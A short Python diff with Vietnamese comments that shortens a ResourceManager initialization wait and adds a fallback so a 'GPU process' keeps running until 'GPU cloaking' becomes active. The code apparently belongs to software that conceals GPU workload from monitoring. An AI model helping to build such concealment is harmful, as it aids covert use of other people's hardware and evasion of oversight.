@@ -1029,23 +1029,24 @@ def main():
     )
     resource_manager_thread_obj.start()
     
-    # **🥈 HIGH FIX: Enhanced Wait for ResourceManager initialization** (chờ khởi tạo ResourceManager nâng cao)
-    logger.info("⏳ [HIGH] Waiting for ResourceManager initialization with extended timeout...")
-    initialization_timeout = 60.0  # 🥈 Tăng từ 20s → 60s để tránh race condition
+    # **🚀 OPTIMIZED: Fast ResourceManager initialization with fallback** (khởi tạo ResourceManager nhanh với dự phòng)
+    logger.info("⏳ [OPTIMIZED] Waiting for ResourceManager with reduced timeout...")
+    initialization_timeout = 10.0  # Giảm từ 60s xuống 10s - không block lâu
     start_wait = time.time()
+    resource_manager_ready = False
     
     while time.time() - start_wait < initialization_timeout:
         if _active_resource_manager_instance is not None:
-            # **🥈 HIGH FIX: Validate SharedResourceManager readiness** (xác thực SharedResourceManager sẵn sàng)
-            if hasattr(_active_resource_manager_instance, 'shared_resource_manager') and _active_resource_manager_instance.shared_resource_manager is not None:
-                logger.info("✅ [HIGH] ResourceManager instance and SharedResourceManager successfully initialized")
-                break
-            else:
-                logger.warning("⚠️ [HIGH] ResourceManager instance exists but SharedResourceManager not yet initialized, continuing to wait...")
-        time.sleep(0.5)
-    else:
-        logger.error("❌ [HIGH] ResourceManager initialization timeout - continuing with warnings")
-        logger.error("🚨 [HIGH] GPU cloaking may not function properly without ResourceManager and SharedResourceManager")
+            # Với lazy initialization, không cần chờ SharedResourceManager ngay
+            logger.info("✅ [OPTIMIZED] ResourceManager instance initialized")
+            resource_manager_ready = True
+            break
+        time.sleep(0.2)  # Giảm sleep time để responsive hơn
+    
+    if not resource_manager_ready:
+        logger.warning("⚠️ [OPTIMIZED] ResourceManager chưa sẵn sàng sau {}s".format(initialization_timeout))
+        logger.info("🔄 [FALLBACK] Hệ thống tiếp tục với chế độ basic - GPU process vẫn chạy")
+        logger.info("📝 [FALLBACK] Cloaking sẽ được kích hoạt khi ResourceManager sẵn sàng")
     
     # **🥉 SOLUTION 3: Start Health Monitoring Thread** (khởi động thread giám sát sức khỏe)
     health_monitor_thread_obj = threading.Thread(
